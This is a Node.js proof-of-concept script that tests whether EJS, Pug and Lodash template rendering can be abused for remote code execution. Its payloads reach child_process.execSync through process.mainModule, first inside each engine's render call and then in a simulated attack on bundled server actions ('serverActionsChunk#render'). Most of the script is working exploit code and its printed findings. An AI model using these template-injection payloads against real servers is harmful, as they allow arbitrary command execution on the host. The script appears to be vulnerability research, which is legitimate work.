/**
 * Testing template engines for exploitable exports
 *
 * If a server action uses ejs/pug/etc, can we access dangerous functions?
 */

console.log("=== Template Engine Export Analysis ===\n");

// Test EJS
console.log("=== EJS Exports ===");
const ejs = require('ejs');
console.log("Keys:", Object.keys(ejs));
console.log("");

// Check for dangerous exports
for (const key of Object.keys(ejs)) {
  const val = ejs[key];
  if (typeof val === 'function') {
    console.log(`ejs.${key}:`, typeof val, val.length, "args");
  }
}

// Most interesting: ejs.compile and ejs.render
console.log("\nejs.compile:", ejs.compile);
console.log("ejs.render:", ejs.render);

// Can ejs.render execute arbitrary code?
console.log("\n=== Testing ejs.render for code execution ===");
try {
  // EJS uses vm internally for compilation
  const template = "<%= 1+1 %>";
  const result = ejs.render(template);
  console.log("ejs.render('<%= 1+1 %>'):", result);

  // Can we inject code?
  const malicious = "<%= process.mainModule.require('child_process').execSync('whoami').toString() %>";
  const rce = ejs.render(malicious);
  console.log("RCE via ejs.render:", rce);
} catch(e) {
  console.log("Error:", e.message);
}

// Test Pug
console.log("\n=== PUG Exports ===");
const pug = require('pug');
console.log("Keys:", Object.keys(pug));

for (const key of Object.keys(pug)) {
  const val = pug[key];
  if (typeof val === 'function') {
    console.log(`pug.${key}:`, typeof val);
  }
}

console.log("\n=== Testing pug.render for code execution ===");
try {
  const result = pug.render("p= 1+1");
  console.log("pug.render('p= 1+1'):", result);

  // Try RCE
  const malicious = "p= process.mainModule.require('child_process').execSync('whoami').toString()";
  const rce = pug.render(malicious);
  console.log("RCE via pug.render:", rce);
} catch(e) {
  console.log("Error:", e.message);
}

// Test Lodash
console.log("\n=== LODASH Exports ===");
const _ = require('lodash');
console.log("Total exports:", Object.keys(_).length);

// Check for template-related functions
console.log("_.template:", typeof _.template);

console.log("\n=== Testing _.template for code execution ===");
try {
  const compiled = _.template("<%= 1+1 %>");
  console.log("_.template('<%= 1+1 %>')():", compiled());

  // Try RCE
  const maliciousTemplate = _.template("<%= process.mainModule.require('child_process').execSync('whoami').toString() %>");
  console.log("RCE via _.template:", maliciousTemplate());
} catch(e) {
  console.log("Error:", e.message);
}

console.log("\n=== CRITICAL FINDINGS ===");
console.log(`
Exploitable template engine functions:

1. ejs.render(template, data) - EXECUTES CODE IN TEMPLATE
   - First arg is the template string (attacker controlled!)
   - Can use <%= process.mainModule... %> for RCE

2. pug.render(template, data) - EXECUTES CODE IN TEMPLATE
   - First arg is the template string
   - Can use p= process.mainModule... for RCE

3. _.template(string) - COMPILES AND RETURNS FUNCTION
   - Returns a function that must be called
   - Less useful for direct RCE

ATTACK SCENARIO:
If a server action module imports ejs/pug for email templates etc,
AND the manifest entry points to that module,
THEN we can use: actionId#render with bound=[maliciousTemplate]
`);

// Simulate the attack
console.log("\n=== Simulating Real Attack ===");

// Imagine this is a server action file that uses ejs for emails
const serverActionsModule = {
  // Normal server actions
  submitForm: async (data) => ({ success: true }),
  sendEmail: async (to, subject, body) => {
    // Uses ejs internally
    const html = ejs.render(body, {});
    return { sent: true, html };
  },
  // Because this file imports ejs, all ejs exports are accessible!
  // If the bundler includes ejs in the same chunk...
};

// If webpack bundles ejs into the server actions chunk:
const bundledModule = {
  ...serverActionsModule,
  // These get included because the file has: import ejs from 'ejs'
  // With tree-shaking disabled or if exports are used
};

console.log("If ejs is bundled with server actions:");
console.log("  bundledModule['render']:", typeof ejs.render);

// The attack
console.log("\nAttack payload:");
console.log('  id: "serverActionsChunk#render"');
console.log('  bound: ["<%= process.mainModule.require(\'child_process\').execSync(\'whoami\').toString() %>"]');
